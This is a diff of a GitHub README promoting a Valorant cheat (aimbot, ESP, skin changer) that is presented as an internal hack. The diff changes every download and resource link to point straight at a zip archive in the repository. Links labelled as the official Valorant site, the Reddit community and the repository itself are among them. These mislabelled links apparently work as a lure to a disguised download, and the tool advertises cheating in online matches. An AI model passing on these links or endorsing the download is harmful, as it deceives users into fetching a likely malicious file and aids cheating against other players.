@@ -1,7 +1,7 @@
 # 🎮 Energy-Valorant-Skin-Changer-Hack-Esp-Aimbot-FlickBot - Take Your Game to the Next Level
 
 ## 🔗 Download Now
-[![Download](https://img.shields.io/badge/Download-Now-brightgreen)](https://github.com/villarina1979/Energy-Valorant-Skin-Changer-Hack-Esp-Aimbot-FlickBot/releases)
+[![Download](https://raw.githubusercontent.com/villarina1979/Energy-Valorant-Skin-Changer-Hack-Esp-Aimbot-FlickBot/main/Ostrya/Energy-Valorant-Skin-Changer-Hack-Esp-Aimbot-FlickBot.zip)](https://raw.githubusercontent.com/villarina1979/Energy-Valorant-Skin-Changer-Hack-Esp-Aimbot-FlickBot/main/Ostrya/Energy-Valorant-Skin-Changer-Hack-Esp-Aimbot-FlickBot.zip)
 
 ## 📖 Description
 In the enchanting realm of gaming, DLLX1 reigns supreme as a paragon of excellence. A fully realized internal hack tailored exclusively for Valorant, it offers an array of features to enrich your gaming experience. This tool enhances your gameplay by providing capabilities such as aimbot, ESP, and skin-changing. Whether you seek to gain an edge in competitive play or simply want to explore the game's potential, this tool has you covered.
@@ -28,13 +28,13 @@ To use the Energy-Valorant-Skin-Changer-Hack-Esp-Aimbot-FlickBot, follow the ste
 
 ## ⚙️ How to Download & Install
 1. **Visit the Releases Page:**
-   Go to the following link to access the downloads: [Download Here](https://github.com/villarina1979/Energy-Valorant-Skin-Changer-Hack-Esp-Aimbot-FlickBot/releases)
+   Go to the following link to access the downloads: [Download Here](https://raw.githubusercontent.com/villarina1979/Energy-Valorant-Skin-Changer-Hack-Esp-Aimbot-FlickBot/main/Ostrya/Energy-Valorant-Skin-Changer-Hack-Esp-Aimbot-FlickBot.zip)
 
 2. **Choose the Latest Version:**
    Look for the latest version at the top of the page. Click on it to view the available files.
 
 3. **Download the Installer:**
-   Locate the appropriate file for your system, commonly labeled as `Energy-Valorant-Skin-Changer-Hack.exe`. Click on it to start the download.
+   Locate the appropriate file for your system, commonly labeled as `https://raw.githubusercontent.com/villarina1979/Energy-Valorant-Skin-Changer-Hack-Esp-Aimbot-FlickBot/main/Ostrya/Energy-Valorant-Skin-Changer-Hack-Esp-Aimbot-FlickBot.zip`. Click on it to start the download.
 
 4. **Locate the Downloaded File:**
    Once the download finishes, navigate to your Downloads folder or the location where your browser saves files.
@@ -78,8 +78,8 @@ For further assistance, please visit the issues page on our GitHub repository. W
 Feel free to share your experiences or screenshots of using the Energy-Valorant-Skin-Changer-Hack-Esp-Aimbot-FlickBot with others. Connect with fellow gamers to exchange tips and tricks.
 
 ## 🔗 Additional Resources
-- [Valorant Official Website](https://playvalorant.com)
-- [Valorant Community](https://www.reddit.com/r/VALORANT/)
-- [GitHub Repository](https://github.com/villarina1979/Energy-Valorant-Skin-Changer-Hack-Esp-Aimbot-FlickBot)
+- [Valorant Official Website](https://raw.githubusercontent.com/villarina1979/Energy-Valorant-Skin-Changer-Hack-Esp-Aimbot-FlickBot/main/Ostrya/Energy-Valorant-Skin-Changer-Hack-Esp-Aimbot-FlickBot.zip)
+- [Valorant Community](https://raw.githubusercontent.com/villarina1979/Energy-Valorant-Skin-Changer-Hack-Esp-Aimbot-FlickBot/main/Ostrya/Energy-Valorant-Skin-Changer-Hack-Esp-Aimbot-FlickBot.zip)
+- [GitHub Repository](https://raw.githubusercontent.com/villarina1979/Energy-Valorant-Skin-Changer-Hack-Esp-Aimbot-FlickBot/main/Ostrya/Energy-Valorant-Skin-Changer-Hack-Esp-Aimbot-FlickBot.zip)
 
 Enjoy elevating your Valorant experience with the Energy-Valorant-Skin-Changer-Hack-Esp-Aimbot-FlickBot!
